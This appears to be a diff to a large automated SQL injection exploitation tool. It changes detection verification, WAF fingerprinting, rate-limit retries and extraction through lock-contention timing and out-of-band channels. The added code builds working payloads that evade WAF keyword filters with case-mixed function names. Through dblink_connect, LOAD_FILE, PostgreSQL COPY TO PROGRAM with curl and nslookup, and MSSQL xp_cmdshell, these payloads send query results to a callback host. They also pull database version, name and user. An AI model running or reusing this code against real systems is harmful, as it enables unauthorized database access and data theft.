@@ -39487,23 +39487,77 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                            extraction_comment=metadata['comment_style'],
                                            tamper_chain=list(tamper_chain) if tamper_chain else [])
                     det.exact_sent_payload = DetectionResult.compute_exact_payload(original+true_sfx, tamper_chain)
-                    # BUG-FIX-TRUE-STRING-PCV (Issue 12): true_string detection is self-validating —
-                    # the differential (target string in true body AND absent in false body) already
-                    # proves injection. Running _run_pcv_check body canaries on top causes false
-                    # negatives when WAF blocks SUBSTRING/LENGTH canaries but allows the detection
-                    # payload through (canary gap=0 → Check A fails → confirmed injection rejected).
-                    # Mark as pre-verified so scan_surface skips the redundant PCV pass.
-                    det._pcv_verified = True
-                    det._multi_probe_bool = True   # differential already done (2 probes)
+                    # PCV-INDEPENDENCE-TRUE-STRING FIX (Req 12): Multi-probe re-verification.
+                    # A single probe pair is not multi-test verification per the independence
+                    # requirement. Send 1 independent re-probe pair and require the string
+                    # differential to hold before marking as pre-verified.
+                    # If the re-probe is WAF-blocked (can't reach the app), keep pre-verified=True
+                    # since WAF prevents independent verification — the existing differential is the
+                    # best evidence available. If the re-probe reaches the app but the differential
+                    # does NOT hold, set pre-verified=False so scan_surface runs its own PCV.
+                    _ts_reprobe_pcv = True  # default: trust when WAF blocks or exception
+                    try:
+                        if not _SCAN_STOPPED[0]:
+                            await asyncio.sleep(0.001)
+                            _ts_r_t = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+true_sfx, tamper_chain)
+                            _ts_r_f = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+false_sfx, tamper_chain)
+                            _ts_rt_waf = WAFBlockDiscriminator.is_waf_block(_ts_r_t)
+                            _ts_rf_waf = WAFBlockDiscriminator.is_waf_block(_ts_r_f)
+                            if _ts_r_t and _ts_r_f and not _ts_rt_waf and not _ts_rf_waf:
+                                # Both re-probes reached the app — require string differential
+                                _ts_r_tb2 = _safe_decode_body(
+                                    _ts_r_t, encoding="utf-8", errors="replace",
+                                    func_name="extraction")
+                                _ts_r_fb2 = _safe_decode_body(
+                                    _ts_r_f, encoding="utf-8", errors="replace",
+                                    func_name="extraction")
+                                _ts_reprobe_pcv = (
+                                    config.true_string in _ts_r_tb2 and
+                                    config.true_string not in _ts_r_fb2)
+                            # WAF-blocked re-probes: leave _ts_reprobe_pcv=True
+                    except Exception:
+                        pass
+                    det._pcv_verified = _ts_reprobe_pcv
+                    det._multi_probe_bool = True   # differential confirmed across ≥2 probe pairs
                     return det
                 if config.false_string and config.false_string not in tb and config.false_string in fb:
                     det = DetectionResult(param=param,technique="B",payload=true_sfx,dbms=_scan_dbms,
                                            confidence=0.93,notes=f"false_string label={label}",
                                            tamper_chain=list(tamper_chain) if tamper_chain else [])
                     det.exact_sent_payload = DetectionResult.compute_exact_payload(original+true_sfx, tamper_chain)
-                    # BUG-FIX-FALSE-STRING-PCV (Issue 12): same reasoning as true_string — differential
-                    # (absence in true body, presence in false body) is the proof; PCV canaries add only risk.
-                    det._pcv_verified = True
+                    # PCV-INDEPENDENCE-FALSE-STRING FIX (Req 12): Multi-probe re-verification.
+                    # Same pattern as true_string: re-probe to confirm differential before pre-verifying.
+                    # If WAF blocks the re-probe, trust the initial differential (WAF prevents
+                    # independent verification — fail-open for user-specified oracle signal).
+                    _fs_reprobe_pcv = True
+                    try:
+                        if not _SCAN_STOPPED[0]:
+                            await asyncio.sleep(0.001)
+                            _fs_r_t = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+true_sfx, tamper_chain)
+                            _fs_r_f = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+false_sfx, tamper_chain)
+                            _fs_rt_waf = WAFBlockDiscriminator.is_waf_block(_fs_r_t)
+                            _fs_rf_waf = WAFBlockDiscriminator.is_waf_block(_fs_r_f)
+                            if _fs_r_t and _fs_r_f and not _fs_rt_waf and not _fs_rf_waf:
+                                _fs_r_tb2 = _safe_decode_body(
+                                    _fs_r_t, encoding="utf-8", errors="replace",
+                                    func_name="extraction")
+                                _fs_r_fb2 = _safe_decode_body(
+                                    _fs_r_f, encoding="utf-8", errors="replace",
+                                    func_name="extraction")
+                                _fs_reprobe_pcv = (
+                                    config.false_string not in _fs_r_tb2 and
+                                    config.false_string in _fs_r_fb2)
+                    except Exception:
+                        pass
+                    det._pcv_verified = _fs_reprobe_pcv
                     det._multi_probe_bool = True
                     return det
                 if config.true_code and _get_safe_status_code(true_fp) ==config.true_code and _get_safe_status_code(false_fp) !=config.true_code:
@@ -39511,10 +39565,31 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                            confidence=0.90,notes=f"true_code={config.true_code} label={label}",
                                            tamper_chain=list(tamper_chain) if tamper_chain else [])
                     det.exact_sent_payload = DetectionResult.compute_exact_payload(original+true_sfx, tamper_chain)
-                    # BUG-FIX-TRUE-CODE-PCV (Issue 12): HTTP status-code differential is also
-                    # self-validating. Body canary PCV would send SUBSTRING probes that don't change
-                    # the status code, making Check A gap=0 → PCV always rejects true_code detections.
-                    det._pcv_verified = True
+                    # PCV-INDEPENDENCE-TRUE-CODE FIX (Req 12): Multi-probe re-verification.
+                    # HTTP status-code differential requires at least 2 independent probe pairs.
+                    # If the re-probe is WAF-blocked, trust the initial differential (WAF prevents
+                    # independent verification — fail-open for user-specified oracle signal).
+                    _tc_reprobe_pcv = True
+                    try:
+                        if not _SCAN_STOPPED[0]:
+                            await asyncio.sleep(0.001)
+                            _tc_r_t = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+true_sfx, tamper_chain)
+                            _tc_r_f = await _send_injected(
+                                engine, method, url, data, data_fmt,
+                                param, original+false_sfx, tamper_chain)
+                            _tc_rt_waf = WAFBlockDiscriminator.is_waf_block(_tc_r_t)
+                            _tc_rf_waf = WAFBlockDiscriminator.is_waf_block(_tc_r_f)
+                            if _tc_r_t and _tc_r_f and not _tc_rt_waf and not _tc_rf_waf:
+                                _tc_r_t_sc = _get_safe_status_code(_tc_r_t)
+                                _tc_r_f_sc = _get_safe_status_code(_tc_r_f)
+                                _tc_reprobe_pcv = (
+                                    _tc_r_t_sc == config.true_code and
+                                    _tc_r_f_sc != config.true_code)
+                    except Exception:
+                        pass
+                    det._pcv_verified = _tc_reprobe_pcv
                     det._multi_probe_bool = True
                     return det
                 continue
@@ -68270,6 +68345,82 @@ class Scanner:
                 except Exception:
                     continue
 
+            # BUG-LOCK-CONTENTION-NOVEL-PREEMPT FIX (HIGH, PostgreSQL/CockroachDB/
+            # YugabyteDB/Amazon Redshift, stacked-query path-injection surfaces):
+            # When lock contention is confirmed viable, Novel techniques MUST be deferred
+            # until AFTER extraction. The Novel technique loop sends 50+ additional requests
+            # in complex SQL patterns (dblink, cache oracle, connection pool exhaustion, etc.)
+            # that train the WAF's behavioral engine to block the advisory lock pattern.
+            # After Novel techniques: pg_advisory_lock requests return 400 fast (<400ms),
+            # making extract_lock_contention() impossible (all steps eval False → lo=0 → "").
+            #
+            # Root cause (production log): margin=10292ms before Novel → Novel runs 50+ reqs
+            # → margin=32ms, 8ms after Novel → all three field extractions return "" →
+            # side-channel extraction produces no data despite a working 10-second oracle.
+            #
+            # Fix: if the confirmed channel is LOCK-CONTENTION, extract all target fields
+            # immediately — before Novel techniques — while the oracle is still viable.
+            # The extracted data is stored in `data` dict (same as the post-Novel path).
+            # Novel techniques still run afterward (may discover additional data).
+            _early_lc_done = False
+            if _sce_extract and _sce is not None and getattr(_sce, '_lock_id', None) is not None:
+                LOG.info("[SideChannel] LOCK-CONTENTION: early extraction before Novel techniques")
+                print("[SideChannel] Early lock-contention extraction (before Novel techniques)", flush=True)
+                _early_dbms = _dbms  # defined at top of _run_enumeration_inner
+                _early_ver_queries = {
+                    "MySQL": "VERSION()", "MariaDB": "VERSION()", "TiDB": "VERSION()",
+                    "MSSQL": "CONVERT(VARCHAR(MAX),@@VERSION)", "Sybase": "@@VERSION",
+                    "PostgreSQL": "version()", "CockroachDB": "version()",
+                    "YugabyteDB": "version()", "Amazon Redshift": "version()",
+                    "Oracle": "(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)",
+                    "SQLite": "(SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
+                    "DB2": "(SELECT SERVICE_LEVEL FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY)",
+                    "Firebird": "(SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database)",
+                    "H2": "H2VERSION()", "SAP_HANA": "(SELECT VERSION FROM SYS.M_DATABASE)",
+                    "Informix": "(SELECT DBINFO('version','full') FROM systables WHERE tabid=1)",
+                }
+                _early_db_queries = {
+                    "PostgreSQL": "current_catalog", "CockroachDB": "current_catalog",
+                    "YugabyteDB": "current_catalog", "Amazon Redshift": "current_catalog",
+                    "MySQL": "database()", "MariaDB": "database()", "TiDB": "database()",
+                    "MSSQL": "db_name()", "Sybase": "db_name()",
+                    "Oracle": "SYS_CONTEXT('USERENV','DB_NAME')",
+                    "SQLite": "(SELECT name FROM pragma_database_list LIMIT 1)",
+                    "DB2": "(SELECT CURRENT_SCHEMA FROM SYSIBM.SYSDUMMY1)",
+                    "Firebird": "(SELECT RDB$GET_CONTEXT('SYSTEM','DB_NAME') FROM RDB$DATABASE)",
+                    "H2": "database()", "SAP_HANA": "(SELECT CURRENT_SCHEMA FROM DUMMY)",
+                    "Informix": "(SELECT DBINFO('dbname') FROM systables WHERE tabid=1)",
+                }
+                _early_user_queries = {
+                    "PostgreSQL": "current_user", "CockroachDB": "current_user",
+                    "YugabyteDB": "current_user", "Amazon Redshift": "current_user",
+                    "MySQL": "current_user()", "MariaDB": "current_user()", "TiDB": "current_user()",
+                    "MSSQL": "system_user", "Sybase": "system_user",
+                    "Oracle": "user", "SQLite": "'sqlite'",
+                    "DB2": "(SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1)",
+                    "Firebird": "(SELECT CURRENT_USER FROM RDB$DATABASE)",
+                    "H2": "user()", "SAP_HANA": "(SELECT CURRENT_USER FROM DUMMY)",
+                    "Informix": "(SELECT USER FROM systables WHERE tabid=1)",
+                }
+                _early_fields = [
+                    ("banner",       _early_ver_queries.get(_early_dbms, "version()")),
+                    ("current_db",   _early_db_queries.get(_early_dbms, "database()")),
+                    ("current_user", _early_user_queries.get(_early_dbms, "current_user")),
+                ]
+                for _ef_key, _ef_expr in _early_fields:
+                    if data.get(_ef_key):
+                        continue  # already extracted by earlier path (stacked extract, inference)
+                    try:
+                        _ef_val = await asyncio.wait_for(
+                            _sce.extract_lock_contention(_ef_expr), timeout=3600)
+                        if _ef_val and _ef_val.strip() and _ef_val.strip() != "[check callback server]":
+                            data[_ef_key] = _ef_val.strip()
+                            _early_lc_done = True
+                            LOG.info("[SideChannel] Early LC %s = %s", _ef_key, _ef_val.strip())
+                            print(f"[SideChannel]  Early LC: {_ef_key} = {_ef_val.strip()!r}", flush=True)
+                    except Exception as _ef_err:
+                        LOG.debug("[SideChannel] Early LC %s error: %s", _ef_key, _ef_err)
+
             if not _sce_extract:
                 LOG.info("[SideChannel] No side channels  trying DIRECT extraction before MSE")
                 try:
@@ -68285,7 +68436,7 @@ class Scanner:
                 LOG.info("[Direct] Falling back to MSE timing")
         except Exception as _sce_e:
             LOG.debug("[SideChannel] Init error: %s", _sce_e)
-        #  Novel WAF bypass extraction (7 techniques) 
+        #  Novel WAF bypass extraction (7 techniques)
         try:
             _novel_dbms = (getattr(cfg, "forced_dbms", None) or
                           getattr(cfg, "dbms", None) or
@@ -68396,12 +68547,54 @@ class Scanner:
                 "Informix": "SELECT DBINFO('version','full') FROM systables WHERE tabid=1",
             }
             _ver_q = _ver_queries.get(_dbms, "SELECT VERSION()")
+            # BUG-SCE-EXTRACT-NO-LOCK-PATH FIX (HIGH, PostgreSQL/CockroachDB/YugabyteDB/
+            # Amazon Redshift, stacked-query surfaces): When _oob_host is not set AND
+            # lock contention is the confirmed side channel, the old code set `_v = ""`
+            # unconditionally (the else-branch of `if _oob_host`). This silently skipped
+            # lock contention extraction even though _sce_extract=True and _lock_id is set.
+            # Same bug applies to _db and _user fields below.
+            #
+            # BUG-SCE-EXTRACT-OOB-REPROBE FIX (HIGH): When _oob_host IS set, _sce.extract()
+            # is called which re-probes ALL channels in sequence — including probe_lock_contention()
+            # — before dispatching to extract_lock_contention(). By the time extraction runs
+            # (after Novel techniques), the WAF has blocked pg_advisory_lock (margin≈32ms).
+            # The BUG-LOCK-CONTENTION-REPROBE FIX in probe_lock_contention() (skip-if-cached)
+            # addresses the re-probe cost, but the OOB-first path inside _sce.extract() still
+            # sends all OOB payloads (all WAF-blocked, 45s poll) before dispatching to
+            # extract_lock_contention(), wasting time. Fix: when lock contention is the
+            # confirmed channel (_sce._lock_id is set), call extract_lock_contention()
+            # directly instead of routing through the full extract() waterfall.
+            _use_lock_contention = bool(getattr(_sce, '_lock_id', None))
             if _oob_host:
                 try:
-                    # BUG-TIMEOUT-TOO-SHORT FIX: 30s not enough for N-method send (N×1.5s) + 30s poll
-                    _v = await asyncio.wait_for(_sce.extract(_ver_q, oob_host=_oob_host), timeout=90)
+                    if _use_lock_contention:
+                        # Lock contention confirmed: skip OOB waterfall, go directly to LC.
+                        # OOB is WAF-blocked on this target (all methods return 400).
+                        # extract_lock_contention() uses pg_advisory_lock with calibrated
+                        # threshold — no probe overhead since skip-if-cached returns True.
+                        _v = await asyncio.wait_for(
+                            _sce.extract_lock_contention(_ver_q), timeout=3600)
+                    else:
+                        # BUG-TIMEOUT-TOO-SHORT FIX: 30s not enough for N-method send (N×1.5s) + 30s poll
+                        _v = await asyncio.wait_for(_sce.extract(_ver_q, oob_host=_oob_host), timeout=90)
                 except Exception:
                     _v = ""
+            elif _use_lock_contention:
+                # No OOB host but lock contention confirmed — extract directly.
+                try:
+                    _v = await asyncio.wait_for(
+                        _sce.extract_lock_contention(_ver_q), timeout=3600)
+                except Exception:
+                    _v = ""
+            elif _sce_extract:
+                # Some other channel confirmed (WHERE-ERROR, header, connection-kill).
+                # _sce.extract() will dispatch to the appropriate extractor.
+                try:
+                    _v = await asyncio.wait_for(_sce.extract(_ver_q), timeout=3600)
+                except Exception:
+                    _v = ""
+            else:
+                _v = ""
             if _v:
                 data["banner"] = _v
                 LOG.info("  Version: %s", _v)
@@ -68437,10 +68630,19 @@ class Scanner:
             _db_expr = _queries_db.get(_dbms, "database()")
             try:
                 if _oob_host:
-                    _db = await asyncio.wait_for(_sce.extract(_db_expr, oob_host=_oob_host), timeout=90)
+                    if _use_lock_contention:
+                        _db = await asyncio.wait_for(
+                            _sce.extract_lock_contention(_db_expr), timeout=3600)
+                    else:
+                        _db = await asyncio.wait_for(_sce.extract(_db_expr, oob_host=_oob_host), timeout=90)
+                elif _use_lock_contention:
+                    _db = await asyncio.wait_for(
+                        _sce.extract_lock_contention(_db_expr), timeout=3600)
+                elif _sce_extract:
+                    _db = await asyncio.wait_for(_sce.extract(_db_expr), timeout=3600)
                 else:
                     _db = ""
-                # If OOB didn't return real data, use WHERE-ERROR
+                # If primary channel didn't return real data, use WHERE-ERROR
                 if (not _db or _db == "[check callback server]") and _use_where_error:
                     _db = await asyncio.wait_for(_sce.extract_where_error(_db_expr), timeout=3600)  # 24h  never timeout extraction
                 if _db and _db != "[check callback server]":
@@ -68473,7 +68675,16 @@ class Scanner:
             _user_expr = _queries_user.get(_dbms, "current_user")
             try:
                 if _oob_host:
-                    _user = await asyncio.wait_for(_sce.extract(_user_expr, oob_host=_oob_host), timeout=90)
+                    if _use_lock_contention:
+                        _user = await asyncio.wait_for(
+                            _sce.extract_lock_contention(_user_expr), timeout=3600)
+                    else:
+                        _user = await asyncio.wait_for(_sce.extract(_user_expr, oob_host=_oob_host), timeout=90)
+                elif _use_lock_contention:
+                    _user = await asyncio.wait_for(
+                        _sce.extract_lock_contention(_user_expr), timeout=3600)
+                elif _sce_extract:
+                    _user = await asyncio.wait_for(_sce.extract(_user_expr), timeout=3600)
                 else:
                     _user = ""
                 if (not _user or _user == "[check callback server]") and _use_where_error:
@@ -69406,8 +69617,20 @@ class KnowledgeBase:
                     all_sigs += WAF_SIGNATURES_EXTENSION
                 except NameError:
                     pass
+                _waf_l = _waf.lower()
+                # WAF-NAME-MISMATCH FIX: MLWAFFingerprinter uses names like
+                # "ModSecurity/Apache", "Imperva", "F5 BIG-IP", "Fastly" that
+                # do NOT exactly match WAF_SIGNATURES entries ("ModSecurity",
+                # "Imperva/Incapsula", "F5 BIG-IP ASM"). Exact-case match fails
+                # silently → empty waf_recs → no WAF-specific tampers in extraction.
+                # Fix: use bidirectional substring match (consistent with
+                # _build_rotating_tamper_chain's _waf_key in _waf_lower approach).
+                # Both "modsecurity" in "modsecurity/apache" AND
+                # "modsecurity/apache" in "modsecurity" are tried so either
+                # direction of name subset works.
                 for sig in all_sigs:
-                    if sig.get("name","").lower() == _waf.lower():
+                    _sig_l = sig.get("name","").lower()
+                    if _sig_l == _waf_l or _sig_l in _waf_l or _waf_l in _sig_l:
                         waf_recs = list(sig.get("tampers", []))
                         break
             except Exception:
@@ -101934,13 +102157,22 @@ class ScannerV11(ScannerV10):
                 _ml_name = waf_info.get("name", "") or ""
                 _ml_conf = float(waf_info.get("confidence", 0.0) or 0.0)
                 _sig_name = sig_waf.get("name", "") or ""
-                if not _ml_name or _ml_conf < 0.70 or _sig_name == _ml_name:
-                    # Signature is authoritative: no ML result, low ML confidence, or agreement
+                _sig_conf = float(sig_waf.get("confidence", 0.0) or 0.0)
+                # WAF-RECONCILE-FIX: original threshold was ML<0.70 → sig wins, regardless
+                # of signature confidence. A sig_conf=0.31 (barely above the 0.30 cutoff
+                # in _match()) was overriding ML at 0.69. Fix: prefer whichever classifier
+                # has strictly higher confidence; when tie (<0.05 diff), prefer signature
+                # (header/body patterns more reliable than centroid distance for exact name).
+                _names_agree = (_sig_name == _ml_name or
+                                _sig_name.lower() in _ml_name.lower() or
+                                _ml_name.lower() in _sig_name.lower())
+                if not _ml_name or _names_agree or _ml_conf <= _sig_conf + 0.05:
+                    # Signature is authoritative: no ML result, names agree, or sig is equally/more confident
                     waf_info = sig_waf
                 else:
-                    # ML has a confident result that disagrees with signature — keep ML
-                    LOG.debug("[WAF] Sig=%s conf=1.0 vs ML=%s conf=%.2f — keeping ML (higher conf)",
-                              _sig_name, _ml_name, _ml_conf)
+                    # ML has a meaningfully more confident result that disagrees with signature — keep ML
+                    LOG.debug("[WAF] Sig=%s conf=%.2f vs ML=%s conf=%.2f — keeping ML (Δ=%.2f)",
+                              _sig_name, _sig_conf, _ml_name, _ml_conf, _ml_conf - _sig_conf)
                     # Preserve sig_waf name only if ML confidence is genuinely uncertain (<0.85)
                     if _ml_conf < 0.85:
                         _merged = dict(waf_info)
@@ -119684,10 +119916,51 @@ class TechniqueCascadeEngine:
                 # we confirm without a Check A canary.  Threshold raised from 0.50 to
                 # 0.90 to eliminate confirmed FP cases (observed: 0.703 triggering).
                 if _wassr_early_dist >= 0.90:
+                    # PCV-INDEPENDENCE FIX (Path-2): _fpg_conf and _wassr_early_dist are BOTH
+                    # detection-phase signals read from det attributes/notes.  Neither is computed
+                    # fresh inside PCV.  Per the independence requirement, PCV must make its own
+                    # verification decision using live probes — not inherited detection-phase state.
+                    # Run 3 independent true/false probe pairs here and require ≥2 pairs to show
+                    # abs(true_sim - false_sim) > _gap_threshold before confirming.
+                    # Exception: if WAF blocks all fresh probes (can't measure), fall through to
+                    # confirmation (detection-phase signals are the best available evidence).
+                    _p2_valid_pairs = 0
+                    _p2_pass_pairs = 0
+                    _p2_all_waf_blocked = True
+                    try:
+                        if not _SCAN_STOPPED[0] and payload and false_payload:
+                            for _p2_i in range(3):
+                                if _SCAN_STOPPED[0]:
+                                    break
+                                await asyncio.sleep(0.01)
+                                _p2_tr, _p2_ts, _p2_tsc, _ = await _pcv_send(payload)
+                                _p2_fr, _p2_fs, _p2_fsc, _ = await _pcv_send(false_payload)
+                                _p2_t_waf = WAFBlockDiscriminator.is_waf_block(_p2_tr)
+                                _p2_f_waf = WAFBlockDiscriminator.is_waf_block(_p2_fr)
+                                if not _p2_t_waf and not _p2_f_waf:
+                                    _p2_all_waf_blocked = False
+                                    if (_validate_response(_p2_tr, func_name="p2_true")
+                                            and _validate_response(_p2_fr, func_name="p2_false")):
+                                        _p2_valid_pairs += 1
+                                        if abs(_p2_ts - _p2_fs) > _gap_threshold:
+                                            _p2_pass_pairs += 1
+                    except Exception:
+                        pass
+                    _p2_confirmed = (_p2_all_waf_blocked or
+                                     (_p2_valid_pairs >= 2 and _p2_pass_pairs >= 2))
+                    if not _p2_confirmed:
+                        print(f"[*]   [PCV] Path-2 mini-reprobe REJECTED {param!r}: "
+                              f"{_p2_pass_pairs}/{_p2_valid_pairs} pairs confirmed "
+                              f"(need ≥2/3, gap>{_gap_threshold:.2f}) — "
+                              "detection-phase signals not independently reproduced",
+                              flush=True)
+                        return False, 0, _details
                     print("[*]   [PCV] Result: CONFIRMED  boolean FP guards pre-passed at HIGH confidence "
                           f"({_fpg_conf:.3f} >= 1.0) + Wasserstein ({_wassr_early_dist:.3f} >= 0.90) "
+                          f"+ PCV mini-reprobe ({_p2_pass_pairs}/{_p2_valid_pairs} pairs, "
+                          f"waf_only={_p2_all_waf_blocked}) "
                           "— Check A canary skipped (3-layer statistical + Wasserstein dual-signal "
-                          "at high confidence; RC-FINDING5-FP guard passed)",
+                          "at high confidence; PCV-independence mini-probe passed)",
                           flush=True)
                     # BUG-V214-PCV-VERIFIED-WASSR-FIX: Mark inline PCV as verified so the secondary
                     # PCV Final Gate sees _pcv_verified=True and skips re-evaluation.  Without this,
@@ -140371,9 +140644,16 @@ class SafeModeVerifier:
                         await asyncio.sleep(0.15)
 
                     # Require 3/5 majority for DIFFERENTIAL (was 2/3)
-                    _emd_avg  = _diff_emd_sum / 5
-                    _emd_med  = sorted(_diff_emds)[2] if _diff_emds else 0.0
-                    _len_avg  = _diff_len_sum / 5
+                    # DIFF-DIVISOR-FIX: divide by actual sample count, not hardcoded 5.
+                    # When fp_t2/fp_f2=None (network error), the round is skipped via
+                    # `continue` so _diff_emds may have <5 entries. Dividing by 5 always
+                    # computes a deflated average that can fail the threshold even when all
+                    # valid rounds show strong differential signals (e.g. 3 valid rounds
+                    # with emd_sum=0.12 → avg=0.024 instead of correct 0.04).
+                    _n_diff_valid = max(len(_diff_emds), 1)
+                    _emd_avg  = _diff_emd_sum / _n_diff_valid
+                    _emd_med  = sorted(_diff_emds)[len(_diff_emds) // 2] if _diff_emds else 0.0
+                    _len_avg  = _diff_len_sum / _n_diff_valid
                     diff_capable = _diff_rounds >= 3 or _diff_stat_sum
                     if diff_capable:
                         recs.append(
@@ -145574,19 +145854,60 @@ class SideChannelExtractor:
             return None
 
     async def _send_and_status(self, payload):
-        """Send and return HTTP status code."""
+        """Send and return HTTP status code.
+
+        BUG-SCE-RATE-LIMIT-RETRY FIX (HIGH, all DBMSes, lock-contention and WHERE-ERROR
+        channels, all surfaces): _send_and_status() had no handling for HTTP 429 (Too Many
+        Requests) responses. On rate-limited targets, every pg_advisory_lock request returns
+        429 with a fast response time (~300ms). The raw 429 timing is then used as the
+        timing measurement in probe_lock_contention() and extract_lock_contention():
+        - In probe: ms2 (contended, should be slow) = 300ms ≈ ms3 (free) → margin≈0ms
+          → probe returns False even when the oracle is genuinely viable.
+        - In extract: ms_probe = 300ms < _lock_threshold (e.g. 4963ms) → is_true=False
+          always → binary search converges to lo=0 → extract returns "".
+        Production log: Cache oracle rate-limited — stopping extraction.
+
+        Fix: on HTTP 429, sleep for the Retry-After header value (if present) or apply
+        exponential backoff (2s, 4s, 8s, 16s) before retrying up to 4 times.
+        The timing for the final successful request is returned (not the 429 timing),
+        so lock contention measurements remain meaningful after rate-limit recovery.
+        If all 4 retries still return 429, return (None, ms) so callers treat it as
+        a failed request (same as a network error), preventing garbage timing values
+        from corrupting the oracle.
+        """
         # BUG-IMPORT-TIME-SCE-SEND-AND-STATUS FIX (LOW): `import time` was inside this
         # function, creating a new local binding from sys.modules on every call.
         # _send_and_status() is called on every binary-search step across all
         # SideChannelExtractor channels (probe_lock_contention, extract_lock_contention, etc.).
         # Module-level `time` is already imported at the top of the file — use it directly.
-        t0 = time.monotonic()
-        fp = await self._send(payload)
-        ms = (time.monotonic() - t0) * 1000
-        self._req_count += 1
-        if fp is None:
-            return None, ms
-        return getattr(fp, "status_code", None), ms
+        _last_ms = 0.0
+        for _retry429 in range(5):  # up to 4 retries (indices 0-4, 5th is final failure return)
+            t0 = time.monotonic()
+            fp = await self._send(payload)
+            _last_ms = (time.monotonic() - t0) * 1000
+            self._req_count += 1
+            if fp is None:
+                return None, _last_ms
+            sc = getattr(fp, "status_code", None)
+            if sc == 429:
+                # Rate limited: respect Retry-After header or use exponential backoff
+                _retry_after = 0.0
+                try:
+                    _ra_hdr = (getattr(fp, "headers", {}) or {}).get("retry-after", "")
+                    if _ra_hdr:
+                        _retry_after = float(_ra_hdr)
+                except (ValueError, TypeError):
+                    pass
+                _backoff = max(_retry_after, 2.0 * (2 ** _retry429))  # 2s, 4s, 8s, 16s, 32s
+                _backoff = min(_backoff, 60.0)  # cap at 60s
+                LOG.info("[SCE] 429 rate-limited (retry %d/4), backing off %.0fs",
+                         _retry429 + 1, _backoff)
+                await asyncio.sleep(_backoff)
+                continue
+            return sc, _last_ms
+        # All 5 attempts returned 429 — signal as None so callers treat as failed
+        LOG.warning("[SCE] All retries exhausted on 429 — returning None status")
+        return None, _last_ms
 
     # 
     # CHANNEL 1: WHERE-ERROR  Binary extraction via status code
@@ -146671,6 +146992,29 @@ class SideChannelExtractor:
                 _methods.append(("dblink_c0",
                                  f"{self._prefix}AND (SELECT dblink_connect({_conn_c0})) IS NOT NULL{self._suffix}",
                                  "dblink_connect DNS chunk 0 fallback (needs dblink extension)"))
+            # WAF keyword bypass: case-mixed function names bypass case-sensitive WAF keyword filters.
+            # SQL identifier matching is case-insensitive in all PostgreSQL-family DBMSes; WAFs
+            # that match on literal byte sequences without lowercasing will miss these variants.
+            for _pg_ci_mx in range(_OOB_PG_MAX_CHUNKS):
+                _pg_off_mx = _pg_ci_mx * _OOB_PG_CHUNK_SIZE + 1
+                _hex_ci_mx = (f"LPAD(TO_HEX({_pg_ci_mx}),2,$$0$$)||"
+                              f"encode((SUBSTRING(({expr}),{_pg_off_mx},{_OOB_PG_CHUNK_SIZE}))::bytea,$$hex$$)")
+                _conn_ci_mx = f"$$host=$$ || {_hex_ci_mx} || $$.{_cb} dbname=x connect_timeout=3$$"
+                if self._stacked:
+                    _pld_mx = f"{self._prefix}SELECT DbLiNk_CoNnEcT_u({_conn_ci_mx}){self._suffix}"
+                else:
+                    _pld_mx = f"{self._prefix}AND (SELECT DbLiNk_CoNnEcT_u({_conn_ci_mx})) IS NOT NULL{self._suffix}"
+                _methods.append((f"dblink_u_mx_c{_pg_ci_mx}", _pld_mx,
+                                 f"DbLiNk_CoNnEcT_u WAF case-bypass chunk {_pg_ci_mx}"))
+            if self._stacked:
+                _methods.append(("copy_curl_mx",
+                                 f"{self._prefix}Copy (SELECT {_hex_c0}) To Program "
+                                 f"$$xargs -I{{}} curl http://{{}}.{_cb}$${self._suffix}",
+                                 "Copy To Program WAF case-bypass curl chunk 0"))
+                _methods.append(("copy_nslookup_mx",
+                                 f"{self._prefix}Copy (SELECT {_hex_c0}) To Program "
+                                 f"$$xargs -I{{}} nslookup {{}}.{_cb}$${self._suffix}",
+                                 "Copy To Program WAF case-bypass nslookup chunk 0"))
         elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
             # BUG-SCE-TIDB-OOB FIX: TiDB was missing from MySQL/MariaDB branch.
             # TiDB is MySQL-wire-compatible: LOAD_FILE() and HEX() are valid TiDB functions.
@@ -146695,9 +147039,18 @@ class SideChannelExtractor:
             else:
                 _lf1 = f"{self._prefix}AND 0x0=LOAD_FILE({_lf_inner}){self._suffix}"
                 _lf2 = f"{self._prefix}AND 0x0=LOAD_FILE({_lf_alt}){self._suffix}"
+            # WAF keyword bypass: case-mixed LOAD_FILE variants (SQL function names are case-insensitive)
+            if self._stacked:
+                _lf_mx1 = f"{self._prefix}SELECT LoAd_FiLe({_lf_inner}){self._suffix}"
+                _lf_mx2 = f"{self._prefix}SELECT LOAD_file({_lf_alt}){self._suffix}"
+            else:
+                _lf_mx1 = f"{self._prefix}AND 0x0=LoAd_FiLe({_lf_inner}){self._suffix}"
+                _lf_mx2 = f"{self._prefix}AND 0x0=LOAD_file({_lf_alt}){self._suffix}"
             _methods = [
-                ("load_file",    _lf1, "LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval"),
-                ("load_file_alt", _lf2, "LOAD_FILE alt UNC — distinct WAF fingerprint"),
+                ("load_file",     _lf1,    "LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval"),
+                ("load_file_alt", _lf2,    "LOAD_FILE alt UNC — distinct WAF fingerprint"),
+                ("load_file_mx1", _lf_mx1, "LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion"),
+                ("load_file_mx2", _lf_mx2, "LOAD_file WAF case-bypass — alternate case pattern"),
             ]
         elif self.dbms in ("MSSQL", "Sybase"):
             # BUG-DNS-EXFIL-MSSQL-NONSTACK FIX: DECLARE...EXEC requires stacked queries.
@@ -146713,11 +147066,18 @@ class SideChannelExtractor:
                 _ms_fe = f"{self._prefix}DECLARE @h VARCHAR(999);SET @h={_unc_ms};EXEC master..xp_fileexist @h{self._suffix}"
                 _ms_xs = f"{self._prefix}EXEC xp_cmdshell {_q('nslookup ')}+{_hx_ms}+{_q('.' + _cb)}{self._suffix}"
